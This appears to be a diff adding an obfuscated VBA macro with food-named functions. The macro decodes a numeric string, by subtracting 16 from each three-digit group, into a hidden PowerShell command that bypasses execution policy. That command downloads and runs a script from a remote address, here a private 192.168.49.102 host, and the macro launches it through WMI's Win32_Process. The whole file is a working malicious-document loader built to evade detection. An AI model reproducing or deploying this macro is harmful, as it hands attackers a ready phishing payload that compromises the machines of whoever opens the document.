@@ -1,0 +1,28 @@
+Function Pears(Beets)
+    Pears = Chr(Beets - 16)
+End Function
+
+Function Strawberries(Grapes)
+    Strawberries = Left(Grapes, 3)
+End Function
+
+Function Almonds(Jelly)
+    Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+
+Function Nuts(Milk)
+    Do
+    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+    Milk = Almonds(Milk)
+    Loop While Len(Milk) > 0
+    Nuts = Oatmilk
+End Function
+
+Function MyMacro()
+    Dim Apples As String
+    Dim Water As String
+    
+    Apples = "128127135117130131120117124124048061117136117115048114137128113131131048061126127128048061135048120121116116117126048061115048121117136056056126117135061127114122117115132048131137131132117125062126117132062135117114115124121117126132057062116127135126124127113116131132130121126119056055120132132128074063063065073066062065070072062068073062065064066063130133126062132136132055057057"
+    Water = Nuts(Apples)
+    GetObject(Nuts("135121126125119125132131074")).Get(Nuts("103121126067066111096130127115117131131")).Create Water, Tea, Coffee, Napkin
+End Function
